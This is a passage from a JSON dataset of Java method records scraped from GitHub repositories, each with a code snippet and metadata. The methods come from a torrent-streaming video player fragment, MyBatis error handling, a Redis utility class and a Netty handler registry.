["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33833, "method_name": "onStreamReady", "class_name": "BaseVideoPlayerFragment", "params": ["Torrent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onStreamReady(Torrent torrent) { }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33834, "method_name": "onServerReady", "class_name": "BaseVideoPlayerFragment", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onServerReady(String url) { }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33835, "method_name": "onStreamProgress", "class_name": "BaseVideoPlayerFragment", "params": ["Torrent", "StreamStatus"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onStreamProgress(Torrent torrent, StreamStatus streamStatus) {\n        int newProgress = (int) ((getDuration() / 100) * streamStatus.progress);\n        if (mStreamerProgress < newProgress) {\n            mStreamerProgress = newProgress;\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33836, "method_name": "onCreateOptionsMenu", "class_name": "BaseVideoPlayerFragment", "params": ["Menu", "MenuInflater"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreateOptionsMenu(Menu menu, MenuInflater inflater) {\n        super.onCreateOptionsMenu(menu, inflater);\n        inflater.inflate(R.menu.activity_player, menu);\n        menu.findItem(R.id.action_reload).setVisible(mShowReload);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33837, "method_name": "onOptionsItemSelected", "class_name": "BaseVideoPlayerFragment", "params": ["MenuItem"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onOptionsItemSelected(MenuItem item) {\n        int i = item.getItemId();\n        if (i == R.id.action_reload) {\n            mMediaPlayer.stop();\n            Canvas canvas = new Canvas();\n            canvas.drawColor(0, PorterDuff.Mode.CLEAR);\n            getVideoSurface().draw(canvas);\n            loadMedia();\n            return true;\n        }\n        return super.onOptionsItemSelected(item);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33838, "method_name": "subsClick", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void subsClick() {\n        if (mMedia != null && mMedia.subtitles != null) {\n            if (getChildFragmentManager().findFragmentByTag(\"overlay_fragment\") != null) return;\n\n            String[] subsOptions = {\n                    getString(R.string.subtitle_language),\n                    getString(R.string.subtitle_size),\n                    getString(R.string.subtitle_timing)\n            };\n\n            StringArraySelectorDialogFragment.show(getChildFragmentManager(), R.string.subtitle_settings, subsOptions, -1,\n                    new DialogInterface.OnClickListener() {\n                        @Override\n                        public void onClick(DialogInterface dialog, int position) {\n                            switch (position) {\n                                case 0:\n                                    subsLanguageSettings();\n                                    break;\n                                case 1:\n                                    subsSizeSettings();\n                                    break;\n                                case 2:\n                                    subsTimingSettings();\n                                    break;\n                            }\n                        }\n                    });\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33839, "method_name": "subsLanguageSettings", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void subsLanguageSettings() {\n        String[] subtitles = mMedia.subtitles.keySet().toArray(new String[mMedia.subtitles.size()]);\n        Arrays.sort(subtitles);\n        final String[] adapterSubtitles = new String[subtitles.length + 2];\n        System.arraycopy(subtitles, 0, adapterSubtitles, 1, subtitles.length);\n\n        adapterSubtitles[0] = SubsProvider.SUBTITLE_LANGUAGE_NONE;\n        adapterSubtitles[adapterSubtitles.length - 1] = \"custom\";\n        String[] readableNames = new String[adapterSubtitles.length];\n\n        for (int i = 0; i < readableNames.length - 1; i++) {\n            String language = adapterSubtitles[i];\n            if (language.equals(SubsProvider.SUBTITLE_LANGUAGE_NONE)) {\n                readableNames[i] = getString(R.string.no_subs);\n            } else {\n                Locale locale = LocaleUtils.toLocale(language);\n                readableNames[i] = locale.getDisplayName(locale);\n            }\n        }\n\n        readableNames[readableNames.length - 1] = \"Custom..\";\n\n        StringArraySelectorDialogFragment.showSingleChoice(\n            getChildFragmentManager(),\n            R.string.subtitles,\n            readableNames,\n            Arrays.asList(adapterSubtitles).indexOf(mCurrentSubsLang),\n            new DialogInterface.OnClickListener() {\n                @Override\n                public void onClick(final DialogInterface dialog, int position) {\n                    if (position == adapterSubtitles.length - 1) {\n                        FileSelectorDialogFragment.show(getChildFragmentManager(), new FileSelectorDialogFragment.Listener() {\n                            @Override\n                            public void onFileSelected(File f) {\n                                if (!f.getPath().endsWith(\".srt\")) {\n                                    Snackbar.make(mRootView, R.string.unknown_error, Snackbar.LENGTH_SHORT).show();\n                                    return;\n                                }\n                                FileSelectorDialogFragment.hide();\n                                mSubsFile = f;\n                                dialog.dismiss();\n                            }\n                        });\n                        return;\n                    }\n                    onSubtitleLanguageSelected(adapterSubtitles[position]);\n                    dialog.dismiss();\n                }\n            });\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33840, "method_name": "subsSizeSettings", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void subsSizeSettings() {\n        Bundle args = new Bundle();\n        args.putString(NumberPickerDialogFragment.TITLE, getString(R.string.subtitle_size));\n        args.putInt(NumberPickerDialogFragment.MAX_VALUE, 60);\n        args.putInt(NumberPickerDialogFragment.MIN_VALUE, SUBTITLE_MINIMUM_SIZE);\n        args.putInt(NumberPickerDialogFragment.DEFAULT_VALUE, getResources().getInteger(R.integer.player_subtitles_default_text_size));\n\n        NumberPickerDialogFragment dialogFragment = new NumberPickerDialogFragment();\n        dialogFragment.setArguments(args);\n        dialogFragment.setOnResultListener(new NumberPickerDialogFragment.ResultListener() {\n            @Override\n            public void onNewValue(int value) {\n                updateSubtitleSize(value);\n            }\n        });\n        dialogFragment.show(getChildFragmentManager(), \"overlay_fragment\");\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33841, "method_name": "subsTimingSettings", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void subsTimingSettings() {\n        Bundle args = new Bundle();\n        args.putString(NumberPickerDialogFragment.TITLE, getString(R.string.subtitle_timing));\n        args.putInt(NumberPickerDialogFragment.MAX_VALUE, 3600);\n        args.putInt(NumberPickerDialogFragment.MIN_VALUE, -3600);\n        args.putInt(NumberPickerDialogFragment.DEFAULT_VALUE, mSubtitleOffset / 60);\n        args.putBoolean(NumberPickerDialogFragment.FOCUSABLE, true);\n\n        NumberPickerDialogFragment dialogFragment = new NumberPickerDialogFragment();\n        dialogFragment.setArguments(args);\n        dialogFragment.setOnResultListener(new NumberPickerDialogFragment.ResultListener() {\n            @Override\n            public void onNewValue(int value) {\n                mSubtitleOffset = value * 60;\n                showTimedCaptionText(null);\n            }\n        });\n        dialogFragment.show(getChildFragmentManager(), \"overlay_fragment\");\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33842, "method_name": "updateSubtitleSize", "class_name": "BaseVideoPlayerFragment", "params": ["int"], "throws": null, "modifiers": ["abstract", "protected"], "return_type": "void", "snippet": "    protected abstract void updateSubtitleSize(int size);\n\n    @Override\n    public void onSubtitleDownloadCompleted(boolean isSuccessful, TimedTextObject subtitleFile) {\n        onSubtitleEnabledStateChanged(isSuccessful);\n        mSubs = subtitleFile;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33843, "method_name": "onSubtitleDownloadCompleted", "class_name": "BaseVideoPlayerFragment", "params": ["boolean", "TimedTextObject"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSubtitleDownloadCompleted(boolean isSuccessful, TimedTextObject subtitleFile) {\n        onSubtitleEnabledStateChanged(isSuccessful);\n        mSubs = subtitleFile;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33844, "method_name": "startBeamPlayerActivity", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void startBeamPlayerActivity();\n}\n\n", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33845, "method_name": "instance", "class_name": "ErrorContext", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "ErrorContext", "snippet": "  public static ErrorContext instance() {\n    ErrorContext context = LOCAL.get();\n    if (context == null) {\n      context = new ErrorContext();\n      LOCAL.set(context);\n    }\n    return context;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/ErrorContext.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33846, "method_name": "store", "class_name": "ErrorContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ErrorContext", "snippet": "  public ErrorContext store() {\n    ErrorContext newContext = new ErrorContext();\n    newContext.stored = this;\n    LOCAL.set(newContext);\n    return LOCAL.get();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/ErrorContext.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33847, "method_name": "recall", "class_name": "ErrorContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ErrorContext", "snippet": "  public ErrorContext recall() {\n    if (stored != null) {\n      LOCAL.set(stored);\n      stored = null;\n    }\n    return LOCAL.get();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/ErrorContext.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33848, "method_name": "resource", "class_name": "ErrorContext", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "ErrorContext", "snippet": "  public ErrorContext resource(String resource) {\n    this.resource = resource;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/ErrorContext.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33849, "method_name": "activity", "class_name": "ErrorContext", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "ErrorContext", "snippet": "  public ErrorContext activity(String activity) {\n    this.activity = activity;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/ErrorContext.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33850, "method_name": "object", "class_name": "ErrorContext", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "ErrorContext", "snippet": "  public ErrorContext object(String object) {\n    this.object = object;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/ErrorContext.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33851, "method_name": "message", "class_name": "ErrorContext", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "ErrorContext", "snippet": "  public ErrorContext message(String message) {\n    this.message = message;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/ErrorContext.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33852, "method_name": "sql", "class_name": "ErrorContext", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "ErrorContext", "snippet": "  public ErrorContext sql(String sql) {\n    this.sql = sql;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/ErrorContext.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33853, "method_name": "cause", "class_name": "ErrorContext", "params": ["Throwable"], "throws": null, "modifiers": ["public"], "return_type": "ErrorContext", "snippet": "  public ErrorContext cause(Throwable cause) {\n    this.cause = cause;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/ErrorContext.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33854, "method_name": "reset", "class_name": "ErrorContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ErrorContext", "snippet": "  public ErrorContext reset() {\n    resource = null;\n    activity = null;\n    object = null;\n    message = null;\n    sql = null;\n    cause = null;\n    LOCAL.remove();\n    return this;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/ErrorContext.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33855, "method_name": "toString", "class_name": "ErrorContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String toString() {\n    StringBuilder description = new StringBuilder();\n\n    // message\n    if (this.message != null) {\n      description.append(LINE_SEPARATOR);\n      description.append(\"### \");\n      description.append(this.message);\n    }\n\n    // resource\n    if (resource != null) {\n      description.append(LINE_SEPARATOR);\n      description.append(\"### The error may exist in \");\n      description.append(resource);\n    }\n\n    // object\n    if (object != null) {\n      description.append(LINE_SEPARATOR);\n      description.append(\"### The error may involve \");\n      description.append(object);\n    }\n\n    // activity\n    if (activity != null) {\n      description.append(LINE_SEPARATOR);\n      description.append(\"### The error occurred while \");\n      description.append(activity);\n    }\n\n    // sql\n    if (sql != null) {\n      description.append(LINE_SEPARATOR);\n      description.append(\"### SQL: \");\n      description.append(sql.replace('\\n', ' ').replace('\\r', ' ').replace('\\t', ' ').trim());\n    }\n\n    // cause\n    if (cause != null) {\n      description.append(LINE_SEPARATOR);\n      description.append(\"### Cause: \");\n      description.append(cause.toString());\n    }\n\n    return description.toString();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/ErrorContext.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33856, "method_name": "exec", "class_name": "LoginForm", "params": ["HttpServletRequest", "HttpServletResponse"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String exec(HttpServletRequest req, HttpServletResponse resp) {\n\t\tString view = \"/member/Login.jsp\";\n\t\treturn view;\n\t}", "url": "https://raw.githubusercontent.com/increpas-cls2/clsProj/branch/clsProj/src/com/increpas/www/controller/member/LoginForm.java", "stars": "2", "class_props": {"extends": null, "implements": ["ClsController"], "modifiers": ["public"]}}, {"id": 33857, "method_name": "longestCommonPrefix", "class_name": "LongestCommonPrefix", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String longestCommonPrefix(String[] strs) {\n        if(strs.length == 0)\n            return \"\";\n\n        String prefix = \"\";\n        char[] chars = strs[0].toCharArray();\n        Stack<String> letters = new Stack<>();\n\n        for(int i = chars.length - 1; i >= 0; i --){\n            letters.push(String.valueOf(chars[i]));\n        }\n\n        while(true){\n            if(letters.isEmpty())\n                return prefix;\n            prefix += letters.pop();\n            for(int i = 1; i < strs.length; i ++){\n                if(strs[i].indexOf(prefix) != 0){\n                    return prefix.substring(0, prefix.length() - 1);\n                }\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/nishantc1527/LeetCode/master/src/LongestCommonPrefix.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33858, "method_name": "getStr", "class_name": "RedisUtil", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getStr(String obj) {\n        String s = stringRedisTemplate.opsForValue().get(obj);\n        return s;\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/RedisUtil.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33859, "method_name": "getStrBatch", "class_name": "RedisUtil", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "    public List<String> getStrBatch(List<String> list) {\n        List<String> stringList = stringRedisTemplate.opsForValue().multiGet(list);\n        return stringList;\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/RedisUtil.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33860, "method_name": "setIfStr", "class_name": "RedisUtil", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean setIfStr(String key, String value) {\n        Boolean aBoolean = stringRedisTemplate.opsForValue().setIfAbsent(key, value);\n        return aBoolean;\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/RedisUtil.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33861, "method_name": "setStr", "class_name": "RedisUtil", "params": ["String", "String", "Long", "TimeUnit"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setStr(String key, String value, Long time, TimeUnit timeUnit) {\n        if (Objects.isNull(time) || Objects.isNull(timeUnit)) {\n            stringRedisTemplate.opsForValue().set(key, value);\n        }\n        stringRedisTemplate.opsForValue().set(key, value, time, timeUnit);\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/RedisUtil.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33862, "method_name": "setStrMap", "class_name": "RedisUtil", "params": ["Map<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setStrMap(Map<String, String> map) {\n        stringRedisTemplate.opsForValue().multiSet(map);\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/RedisUtil.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33863, "method_name": "setStrIfMap", "class_name": "RedisUtil", "params": ["Map<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "Boolean", "snippet": "    public Boolean setStrIfMap(Map<String, String> map) {\n        Boolean aBoolean = stringRedisTemplate.opsForValue().multiSetIfAbsent(map);\n        return aBoolean;\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/RedisUtil.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33864, "method_name": "strDecrement", "class_name": "RedisUtil", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long strDecrement(String key) {\n        Long decrement = stringRedisTemplate.opsForValue().decrement(key);\n        return decrement;\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/RedisUtil.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33865, "method_name": "strIncrement", "class_name": "RedisUtil", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long strIncrement(String key) {\n        Long decrement = stringRedisTemplate.opsForValue().increment(key);\n        return decrement;\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/RedisUtil.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33866, "method_name": "strDelete", "class_name": "RedisUtil", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean strDelete(String key) {\n        Boolean delete = stringRedisTemplate.opsForValue().getOperations().delete(key);\n        return delete;\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/RedisUtil.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33867, "method_name": "getHash", "class_name": "RedisUtil", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getHash(String key, String hashKey) {\n        Object o = stringRedisTemplate.opsForHash().get(key, hashKey);\n        return String.valueOf(o);\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/RedisUtil.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33868, "method_name": "getHashValue", "class_name": "RedisUtil", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getHashValue(String key) {\n        Object o = stringRedisTemplate.opsForHash().values(key);\n        return String.valueOf(o);\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/RedisUtil.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33869, "method_name": "putMap", "class_name": "RedisUtil", "params": ["String", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void putMap(String key, String mapKey, String value) {\n        stringRedisTemplate.opsForHash().put(key, mapKey, value);\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/RedisUtil.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33870, "method_name": "putMapAll", "class_name": "RedisUtil", "params": ["String", "Map<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void putMapAll(String key, Map<String, String> map) {\n        stringRedisTemplate.opsForHash().putAll(key, map);\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/RedisUtil.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33871, "method_name": "deleteSession", "class_name": "RedisUtil", "params": ["String", "Integer", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void deleteSession(String key, Integer userId, String sessionId) {\n        Map<Object, Object> entries = stringRedisTemplate.opsForHash().entries(key);\n        for (Map.Entry<Object, Object> objectObjectEntry : entries.entrySet()) {\n            if (String.valueOf(objectObjectEntry.getValue()).equals(String.valueOf(userId))) {\n                if (!objectObjectEntry.getKey().equals(sessionId) ) {\n                    log.info(\"\u5931\u8bef\u64cd\u4f5c\uff0c\u5220\u9664\u7684key getKey:{} userId{}\", objectObjectEntry.getKey(), userId);\n                    this.deleteMap(\"sid\", String.valueOf(objectObjectEntry.getKey()));\n                }\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/RedisUtil.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33872, "method_name": "deleteMap", "class_name": "RedisUtil", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long deleteMap(String key, String keyMap) {\n        if (Objects.isNull(keyMap)) {\n            Long delete = stringRedisTemplate.opsForHash().delete(key);\n            return delete;\n        } else {\n            Long delete = stringRedisTemplate.opsForHash().delete(key, keyMap);\n            return delete;\n        }\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/RedisUtil.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33873, "method_name": "getList", "class_name": "RedisUtil", "params": ["String", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "    public List<String> getList(String key,int start,int end){\n        return stringRedisTemplate.opsForList().range(key,start,end);\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/RedisUtil.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33874, "method_name": "remove", "class_name": "RedisUtil", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long remove(String key,String value){\n        return stringRedisTemplate.opsForList().remove(key,0,value);\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/RedisUtil.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33875, "method_name": "main", "class_name": "RedisUtil", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        RedisUtil redisUtil = new RedisUtil();\n        redisUtil.setStr(\"123\", \"123\", null, null);\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/RedisUtil.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33876, "method_name": "scanHandler", "class_name": "PackageHandlerProcessor", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void scanHandler(String packageName) {\n        Set<Class<?>> packages = ClassUtil.scanPackageBySuper(packageName, PackageHandler.class);\n        for (Class<?> aPackage : packages) {\n            try {\n                registerHandler((PackageHandler<? extends ProtocolBody>) aPackage.newInstance());\n            } catch (InstantiationException | IllegalAccessException e) {\n                e.printStackTrace();\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/netty/tcp/core/PackageHandlerProcessor.java", "stars": "6", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33877, "method_name": "registerHandler", "class_name": "PackageHandlerProcessor", "params": ["PackageHandler<ProtocolBody>"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void registerHandler(PackageHandler<? extends ProtocolBody> packageHandler) {\n        // \u4ece\u6cdb\u578b\u63a5\u53e3\u4e2d\u62ff\u51fa\u7c7b\u578b\n        ParameterizedType parameterizedType = (ParameterizedType) packageHandler.getClass().getGenericInterfaces()[0];\n        Type actualTypeArgument = parameterizedType.getActualTypeArguments()[0];\n        if (!CACHE_MAP.containsKey(actualTypeArgument.getTypeName())) {\n            CACHE_MAP.put(actualTypeArgument.getTypeName(), packageHandler);\n            log.debug(\"Register Handler: {} {}\", actualTypeArgument.getTypeName(), packageHandler.getClass().getName());\n        }\n    }", "url": 